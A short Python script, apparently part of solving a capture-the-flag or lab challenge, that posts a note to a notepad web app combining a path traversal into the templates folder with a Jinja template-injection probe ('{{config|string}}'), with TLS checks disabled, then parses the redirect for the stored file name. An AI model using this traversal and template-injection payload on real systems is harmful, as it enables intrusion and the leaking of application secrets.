import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})

content = "\\..\\templates\\errors\\probe{{config|string}}"
r = S.post(BASE + "/new", data={"content": content}, timeout=20, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
print("status:", r.status_code)
print("loc:", loc[:250])
m = re.search(r"/static/(.+)\.html$", loc)
if not m:
    print("pas de nom")
    sys.exit(1)
raw = m.group(1)
# le nom sur disque = ce qui suit le dernier / apres normalisation
print("raw name:", raw)
